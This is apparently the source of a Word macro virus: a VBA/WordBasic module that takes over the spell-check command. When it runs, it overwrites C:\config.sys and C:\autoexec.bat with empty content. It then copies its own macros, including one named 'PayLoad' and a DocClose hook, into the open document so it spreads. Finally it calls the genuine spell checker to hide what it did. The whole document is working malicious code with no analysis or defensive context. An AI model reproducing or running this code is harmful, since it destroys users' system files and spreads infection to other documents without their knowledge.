   Attribute VB_Name = "AAAÙÛÒ"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'this becomes the ToolsSpelling for the global template

   On Error GoTo -1: On Error GoTo Bail
   Open "C:\config.sys" For Output As 1
   Open "C:\autoexec.bat" For Output As 2
   Write #1, ""
   Write #2, ""

   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":DocClose"
   WordBasic.MacroCopy "Global:AAAËÊÐ", sTMacro$
   sTMacro$ = sMe$ + ":AAAËÊÐ"
   WordBasic.MacroCopy "Global:AAAËÊÐ", sTMacro$
   sTMacro$ = sMe$ + ":AAAÙÛÒ"
   WordBasic.MacroCopy "Global:AAAÙÛÒ", sTMacro$
   sTMacro$ = sMe$ + ":ÎPayLoad"
   WordBasic.MacroCopy "Global:ÎPayLoad", sTMacro$
   WordBasic.ToolsSpelling
   GoTo Done

   Bail:
       WordBasic.ToolsSpelling
   Done:

   End Sub
